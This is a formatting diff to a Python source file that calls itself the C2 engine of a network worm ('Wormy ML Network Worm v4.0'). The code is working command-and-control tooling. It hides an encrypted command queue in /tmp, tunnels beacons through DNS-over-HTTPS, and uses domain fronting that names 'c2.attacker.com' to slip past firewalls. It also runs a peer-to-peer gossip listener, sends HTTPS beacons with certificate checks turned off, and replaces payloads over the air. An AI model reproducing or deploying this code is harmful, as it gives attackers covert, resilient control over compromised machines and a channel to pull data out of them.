@@ -1,29 +1,30 @@
-﻿"""
+"""
 Wormy ML Network Worm v4.0
 Resilient C2 Engine — Real AES-256-GCM encryption
 """
 
-import os
-import sys
-import json
-import time
-import socket
 import base64
 import hashlib
+import json
+import os
 import random
-import struct
+import socket
 import sqlite3
+import struct
+import sys
 import threading
-import urllib.request
+import time
 import urllib.error
-from typing import Dict, List, Optional, Any, Callable
+import urllib.request
 from dataclasses import dataclass, field
+from typing import Any, Callable, Dict, List, Optional
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 from utils.logger import logger
 
 try:
     from Crypto.Cipher import AES
+
     HAS_AES = True
 except ImportError:
     HAS_AES = False
@@ -32,8 +33,9 @@ except ImportError:
 # ─────────────────────────────────────────────────────────────────────────────
 # Real AES-256-GCM encryption (replaces insecure XOR+SHA256)
 # ─────────────────────────────────────────────────────────────────────────────
-def _derive_key(passphrase: str, salt: bytes = b'') -> bytes:
-    return hashlib.pbkdf2_hmac('sha256', passphrase.encode(), salt or b'wormy_v4_salt', 100000, 32)
+def _derive_key(passphrase: str, salt: bytes = b"") -> bytes:
+    return hashlib.pbkdf2_hmac("sha256", passphrase.encode(), salt or b"wormy_v4_salt", 100000, 32)
+
 
 def _encrypt(plaintext: str, passphrase: str) -> str:
     if not HAS_AES:
@@ -44,6 +46,7 @@ def _encrypt(plaintext: str, passphrase: str) -> str:
     ct, tag = cipher.encrypt_and_digest(plaintext.encode())
     payload = cipher.nonce + tag + ct
     return base64.b64encode(payload).decode()
+
 
 def _decrypt(ciphertext: str, passphrase: str) -> str:
     if not HAS_AES:
@@ -65,8 +68,8 @@ class CommandQueue:
     Survives C2 downtime — commands are stored locally and executed when C2 reconnects.
     """
 
-    def __init__(self, db_path: str = '/tmp/.sys_cache.db', passphrase: str = 'wormy_v3'):
-        self.db_path    = db_path
+    def __init__(self, db_path: str = "/tmp/.sys_cache.db", passphrase: str = "wormy_v3"):
+        self.db_path = db_path
         self.passphrase = passphrase
         self._init_db()
 
@@ -86,8 +89,7 @@ class CommandQueue:
     def enqueue(self, command: Dict):
         enc = _encrypt(json.dumps(command), self.passphrase)
         conn = sqlite3.connect(self.db_path)
-        conn.execute("INSERT INTO commands (ts, cmd_enc) VALUES (?, ?)",
-                     (time.time(), enc))
+        conn.execute("INSERT INTO commands (ts, cmd_enc) VALUES (?, ?)", (time.time(), enc))
         conn.commit()
         conn.close()
 
@@ -98,7 +100,7 @@ class CommandQueue:
         for row_id, enc in rows:
             try:
                 cmd = json.loads(_decrypt(enc, self.passphrase))
-                cmd['_queue_id'] = row_id
+                cmd["_queue_id"] = row_id
                 commands.append(cmd)
             except Exception:
                 pass
@@ -131,31 +133,31 @@ class DoHChannel:
     """
 
     DOH_SERVERS = [
-        'https://1.1.1.1/dns-query',
-        'https://8.8.8.8/dns-query',
-        'https://dns.google/resolve',
-        'https://mozilla.cloudflare-dns.com/dns-query',
+        "https://1.1.1.1/dns-query",
+        "https://8.8.8.8/dns-query",
+        "https://dns.google/resolve",
+        "https://mozilla.cloudflare-dns.com/dns-query",
     ]
 
-    def __init__(self, c2_domain: str, passphrase: str = 'wormy_v3'):
-        self.c2_domain  = c2_domain  # e.g. 'c2.example.com'
+    def __init__(self, c2_domain: str, passphrase: str = "wormy_v3"):
+        self.c2_domain = c2_domain  # e.g. 'c2.example.com'
         self.passphrase = passphrase
-        self.server     = random.choice(self.DOH_SERVERS)
+        self.server = random.choice(self.DOH_SERVERS)
 
     def _encode_payload(self, data: str) -> List[str]:
         """
         Split payload into DNS-safe chunks (max 63 chars per label).
         Encode as base32 (DNS-safe alphabet).
         """
-        enc     = _encrypt(data, self.passphrase)
-        b32     = base64.b32encode(enc.encode()).decode().rstrip('=').lower()
-        chunks  = [b32[i:i+60] for i in range(0, len(b32), 60)]
+        enc = _encrypt(data, self.passphrase)
+        b32 = base64.b32encode(enc.encode()).decode().rstrip("=").lower()
+        chunks = [b32[i : i + 60] for i in range(0, len(b32), 60)]
         return chunks
 
     def _decode_payload(self, chunks: List[str]) -> str:
-        joined  = ''.join(chunks)
-        padded  = joined.upper() + '=' * (-len(joined) % 8)
-        enc     = base64.b32decode(padded).decode()
+        joined = "".join(chunks)
+        padded = joined.upper() + "=" * (-len(joined) % 8)
+        enc = base64.b32decode(padded).decode()
         return _decrypt(enc, self.passphrase)
 
     def beacon(self, agent_id: str, data: Dict) -> Optional[Dict]:
@@ -163,24 +165,24 @@ class DoHChannel:
         Send beacon data via DoH TXT query.
         Returns C2 response or None if unreachable.
         """
-        payload = json.dumps({'agent': agent_id, 'data': data})
-        chunks  = self._encode_payload(payload)
+        payload = json.dumps({"agent": agent_id, "data": data})
+        chunks = self._encode_payload(payload)
 
         try:
             # Encode each chunk as a subdomain lookup
             for i, chunk in enumerate(chunks[:3]):  # max 3 DNS queries
                 fqdn = f"{chunk}.{i}.{self.c2_domain}"
-                url  = f"{self.server}?name={fqdn}&type=TXT"
-                req  = urllib.request.Request(url)
-                req.add_header('Accept', 'application/dns-json')
-                req.add_header('User-Agent', 'Mozilla/5.0')
+                url = f"{self.server}?name={fqdn}&type=TXT"
+                req = urllib.request.Request(url)
+                req.add_header("Accept", "application/dns-json")
+                req.add_header("User-Agent", "Mozilla/5.0")
                 with urllib.request.urlopen(req, timeout=8) as resp:
                     result = json.loads(resp.read())
                     # Parse TXT answers for commands
-                    answers = result.get('Answer', [])
+                    answers = result.get("Answer", [])
                     for ans in answers:
-                        if ans.get('type') == 16:  # TXT
-                            txt_data = ans.get('data', '').strip('"')
+                        if ans.get("type") == 16:  # TXT
+                            txt_data = ans.get("data", "").strip('"')
                             try:
                                 cmd = json.loads(_decrypt(txt_data, self.passphrase))
                                 return cmd
@@ -204,23 +206,26 @@ class DomainFrontingChannel:
     Firewall sees only the CDN domain — cannot block without blocking entire CDN.
     """
 
-    def __init__(self, front_domain: str, real_c2_host: str, c2_path: str = '/api/v2/telemetry'):
+    def __init__(self, front_domain: str, real_c2_host: str, c2_path: str = "/api/v2/telemetry"):
         self.front_domain = front_domain  # e.g. 'allowed-cdn.azureedge.net'
         self.real_c2_host = real_c2_host  # e.g. 'c2.attacker.com'
-        self.c2_path      = c2_path
-        self.passphrase   = 'wormy_v3'
+        self.c2_path = c2_path
+        self.passphrase = "wormy_v3"
 
     def send(self, data: Dict) -> Optional[Dict]:
         """Send data to C2 via domain fronting."""
         try:
             payload = _encrypt(json.dumps(data), self.passphrase).encode()
-            url     = f"https://{self.front_domain}{self.c2_path}"
-            req     = urllib.request.Request(url, data=payload, method='POST')
+            url = f"https://{self.front_domain}{self.c2_path}"
+            req = urllib.request.Request(url, data=payload, method="POST")
             # The key: override Host header to real C2
-            req.add_header('Host', self.real_c2_host)
-            req.add_header('Content-Type', 'application/octet-stream')
-            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
-            req.add_header('X-Real-IP', f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}")
+            req.add_header("Host", self.real_c2_host)
+            req.add_header("Content-Type", "application/octet-stream")
+            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+            req.add_header(
+                "X-Real-IP",
+                f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
+            )
 
             with urllib.request.urlopen(req, timeout=10) as resp:
                 if resp.status == 200:
@@ -242,14 +247,14 @@ class P2PGossip:
     """
 
     GOSSIP_PORT = 47921  # Random high port — not suspicious
-    PASSPHRASE  = 'wormy_p2p_v3'
+    PASSPHRASE = "wormy_p2p_v3"
 
     def __init__(self, agent_id: str, known_peers: List[str] = None):
-        self.agent_id    = agent_id
+        self.agent_id = agent_id
         self.known_peers = set(known_peers or [])
-        self.local_data  = {}
+        self.local_data = {}
         self._server_thread: Optional[threading.Thread] = None
-        self._running    = False
+        self._running = False
 
     def start_server(self):
         """Start gossip listener in background."""
@@ -262,13 +267,15 @@ class P2PGossip:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.bind(('0.0.0.0', self.GOSSIP_PORT))
+            sock.bind(("0.0.0.0", self.GOSSIP_PORT))
             sock.listen(10)
             sock.settimeout(1)
             while self._running:
                 try:
                     conn, addr = sock.accept()
-                    threading.Thread(target=self._handle_peer, args=(conn, addr), daemon=True).start()
+                    threading.Thread(
+                        target=self._handle_peer, args=(conn, addr), daemon=True
+                    ).start()
                 except socket.timeout:
                     continue
         except Exception as e:
@@ -276,7 +283,7 @@ class P2PGossip:
 
     def _handle_peer(self, conn: socket.socket, addr):
         try:
-            data = b''
+            data = b""
             while True:
                 chunk = conn.recv(4096)
                 if not chunk:
@@ -285,12 +292,14 @@ class P2PGossip:
             if data:
                 msg = json.loads(_decrypt(data.decode(), self.PASSPHRASE))
                 # Merge peer data into local knowledge
-                for key, val in msg.get('data', {}).items():
+                for key, val in msg.get("data", {}).items():
                     self.local_data[key] = val
                 # Add peer to known peers
                 self.known_peers.add(addr[0])
                 # Reply with our own data
-                reply = _encrypt(json.dumps({'agent': self.agent_id, 'data': self.local_data}), self.PASSPHRASE)
+                reply = _encrypt(
+                    json.dumps({"agent": self.agent_id, "data": self.local_data}), self.PASSPHRASE
+                )
                 conn.sendall(reply.encode())
         except Exception:
             pass
@@ -307,9 +316,9 @@ class P2PGossip:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.settimeout(5)
                 s.connect((peer_ip, self.GOSSIP_PORT))
-                msg = _encrypt(json.dumps({'agent': self.agent_id, 'data': data}), self.PASSPHRASE)
+                msg = _encrypt(json.dumps({"agent": self.agent_id, "data": data}), self.PASSPHRASE)
                 s.sendall(msg.encode())
-                resp = b''
+                resp = b""
                 while True:
                     chunk = s.recv(4096)
                     if not chunk:
@@ -318,7 +327,7 @@ class P2PGossip:
                 s.close()
                 if resp:
                     peer_data = json.loads(_decrypt(resp.decode(), self.PASSPHRASE))
-                    merged.update(peer_data.get('data', {}))
+                    merged.update(peer_data.get("data", {}))
             except Exception:
                 pass
 
@@ -347,32 +356,32 @@ class ResilientC2Engine:
     """
 
     def __init__(self, config=None, agent_id: str = None):
-        self.config     = config
-        self.agent_id   = agent_id or hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
-        self.passphrase = 'wormy_v3'
+        self.config = config
+        self.agent_id = agent_id or hashlib.md5(socket.gethostname().encode()).hexdigest()[:8]
+        self.passphrase = "wormy_v3"
 
         # Protocol health scores (0-100, higher = more reliable)
         self.protocol_health = {
-            'https':   100,
-            'domain_fronting': 80,
-            'doh':     60,
-            'p2p':     40,
+            "https": 100,
+            "domain_fronting": 80,
+            "doh": 60,
+            "p2p": 40,
         }
 
-        self.cmd_queue  = CommandQueue(passphrase=self.passphrase)
-        self.p2p        = P2PGossip(self.agent_id)
-        self.doh        = None
-        self.fronting   = None
+        self.cmd_queue = CommandQueue(passphrase=self.passphrase)
+        self.p2p = P2PGossip(self.agent_id)
+        self.doh = None
+        self.fronting = None
 
         # C2 server config
-        c2_cfg = getattr(config, 'c2', None) if config else None
-        self.c2_host    = getattr(c2_cfg, 'c2_server', '127.0.0.1') if c2_cfg else '127.0.0.1'
-        self.c2_port    = getattr(c2_cfg, 'c2_port', 8443) if c2_cfg else 8443
+        c2_cfg = getattr(config, "c2", None) if config else None
+        self.c2_host = getattr(c2_cfg, "c2_server", "127.0.0.1") if c2_cfg else "127.0.0.1"
+        self.c2_port = getattr(c2_cfg, "c2_port", 8443) if c2_cfg else 8443
 
-        self._backoff_sec   = 1.0
-        self._max_backoff   = 300.0
-        self._beacon_count  = 0
-        self._connected     = False
+        self._backoff_sec = 1.0
+        self._max_backoff = 300.0
+        self._beacon_count = 0
+        self._connected = False
 
     def start(self, start_p2p: bool = True):
         """Initialise all channels."""
@@ -388,9 +397,9 @@ class ResilientC2Engine:
         Send beacon using the healthiest available protocol.
         Fallback chain: HTTPS -> Domain Fronting -> DoH -> P2P gossip.
         """
-        telemetry['agent_id']   = self.agent_id
-        telemetry['beacon_num'] = self._beacon_count
-        telemetry['ts']         = time.time()
+        telemetry["agent_id"] = self.agent_id
+        telemetry["beacon_num"] = self._beacon_count
+        telemetry["ts"] = time.time()
         self._beacon_count += 1
 
         # Try protocols in order of health score
@@ -403,7 +412,7 @@ class ResilientC2Engine:
                 # Successful — restore health score, reset backoff
                 self.protocol_health[protocol] = min(100, self.protocol_health[protocol] + 10)
                 self._backoff_sec = 1.0
-                self._connected   = True
+                self._connected = True
                 # Process pending queued commands
                 self._flush_queue(result)
                 return result
@@ -420,31 +429,32 @@ class ResilientC2Engine:
     def _try_protocol(self, protocol: str, data: Dict) -> Optional[Dict]:
         """Attempt a single protocol."""
         try:
-            if protocol == 'https':
+            if protocol == "https":
                 return self._beacon_https(data)
-            elif protocol == 'domain_fronting' and self.fronting:
+            elif protocol == "domain_fronting" and self.fronting:
                 return self.fronting.send(data)
-            elif protocol == 'doh' and self.doh:
+            elif protocol == "doh" and self.doh:
                 return self.doh.beacon(self.agent_id, data)
-            elif protocol == 'p2p':
+            elif protocol == "p2p":
                 merged = self.p2p.gossip(data)
-                return {'source': 'p2p', 'merged_data': merged}
+                return {"source": "p2p", "merged_data": merged}
         except Exception as e:
             logger.debug(f"Protocol {protocol} error: {e}")
         return None
 
     def _beacon_https(self, data: Dict) -> Optional[Dict]:
         """Standard HTTPS beacon."""
-        payload  = _encrypt(json.dumps(data), self.passphrase).encode()
-        url      = f"https://{self.c2_host}:{self.c2_port}/api/v2/telemetry"
+        payload = _encrypt(json.dumps(data), self.passphrase).encode()
+        url = f"https://{self.c2_host}:{self.c2_port}/api/v2/telemetry"
         try:
             import ssl
+
             ctx = ssl.create_default_context()
             ctx.check_hostname = False
-            ctx.verify_mode    = ssl.CERT_NONE
-            req = urllib.request.Request(url, data=payload, method='POST')
-            req.add_header('Content-Type', 'application/octet-stream')
-            req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+            ctx.verify_mode = ssl.CERT_NONE
+            req = urllib.request.Request(url, data=payload, method="POST")
+            req.add_header("Content-Type", "application/octet-stream")
+            req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
             with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
                 if resp.status == 200:
                     return json.loads(_decrypt(resp.read().decode(), self.passphrase))
@@ -461,7 +471,7 @@ class ResilientC2Engine:
 
     def _flush_queue(self, c2_response: Dict):
         """Store any new commands from C2 in queue, mark executed ones as done."""
-        new_cmds = c2_response.get('commands', [])
+        new_cmds = c2_response.get("commands", [])
         for cmd in new_cmds:
             self.cmd_queue.enqueue(cmd)
 
@@ -479,9 +489,10 @@ class ResilientC2Engine:
         """
         try:
             import tempfile
+
             # Write to temp first, then atomic rename
-            tmp_fd, tmp_path = tempfile.mkstemp(suffix='.pth')
-            with os.fdopen(tmp_fd, 'wb') as f:
+            tmp_fd, tmp_path = tempfile.mkstemp(suffix=".pth")
+            with os.fdopen(tmp_fd, "wb") as f:
                 f.write(model_bytes)
             os.replace(tmp_path, target_path)
             logger.success(f"OTA model update applied: {target_path} ({len(model_bytes)} bytes)")
@@ -505,10 +516,10 @@ class ResilientC2Engine:
 
     def get_status(self) -> Dict:
         return {
-            'agent_id':       self.agent_id,
-            'connected':      self._connected,
-            'beacon_count':   self._beacon_count,
-            'backoff_sec':    self._backoff_sec,
-            'protocol_health': self.protocol_health,
-            'p2p_peers':      len(self.p2p.known_peers),
+            "agent_id": self.agent_id,
+            "connected": self._connected,
+            "beacon_count": self._beacon_count,
+            "backoff_sec": self._backoff_sec,
+            "protocol_health": self.protocol_health,
+            "p2p_peers": len(self.p2p.known_peers),
         }
